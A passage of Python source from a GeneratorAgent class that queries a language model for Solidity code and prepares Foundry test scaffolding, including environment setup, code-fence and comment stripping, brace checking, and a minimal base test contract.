            kwargs.update(max_tokens=64000, extra_body={"thinking": {"type": "enabled", "budget_tokens": 2000}})
        response = self.client.chat.completions.create(**kwargs)
        return response.choices[0].message.content or ""

    @staticmethod
    def _forge_env() -> Dict[str, str]:
        """Give Foundry a Windows home directory when invoked from a service."""
        env = os.environ.copy()
        home = env.get("HOME") or env.get("USERPROFILE") or str(Path.home())
        # svm-rs uses the Windows profile variables while other Foundry
        # components use HOME.  A service process can omit either set.
        env["HOME"] = home
        env["USERPROFILE"] = home
        drive, tail = os.path.splitdrive(home)
        if drive:
            env["HOMEDRIVE"] = drive
            env["HOMEPATH"] = tail or "\\"
        return env

    @staticmethod
    def _clean_solidity(response: str) -> str:
        match = re.search(r"```(?:solidity)?\s*([\s\S]*?)\s*```", response)
        return (match.group(1) if match else response).strip()

    @staticmethod
    def _without_comments(text: str) -> str:
        return re.sub(r"//.*?$|/\*[\s\S]*?\*/", "", text, flags=re.M).strip()

    @staticmethod
    def _braces_match(code: str) -> bool:
        stripped = GeneratorAgent._without_comments(re.sub(r'"(?:\\.|[^"\\])*"|\'(?:\\.|[^\'\\])*\'', '""', code))
        depth = 0
        for char in stripped:
            if char == "{": depth += 1
            elif char == "}":
                depth -= 1
                if depth < 0: return False
        return depth == 0

    @staticmethod
    def _function_body(code: str, name: str) -> str:
        match = re.search(rf"\bfunction\s+{re.escape(name)}\s*\([^)]*\)[^{{]*{{", code)
        if not match: return ""
        start, depth = match.end(), 1
        for index in range(start, len(code)):
            if code[index] == "{": depth += 1
            elif code[index] == "}":
                depth -= 1
                if depth == 0: return code[start:index]
        return ""

    def generate_basetest_file(self) -> str:
        self.test_dir.mkdir(parents=True, exist_ok=True)
        filename = self.test_dir / "basetest.sol"
        if not filename.exists():
            filename.write_text("""// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;
import \"forge-std/Test.sol\";
contract BaseTestWithBalanceLog is Test {
    modifier balanceLog() { _; }
}
""", encoding="utf-8")
        return str(filename)
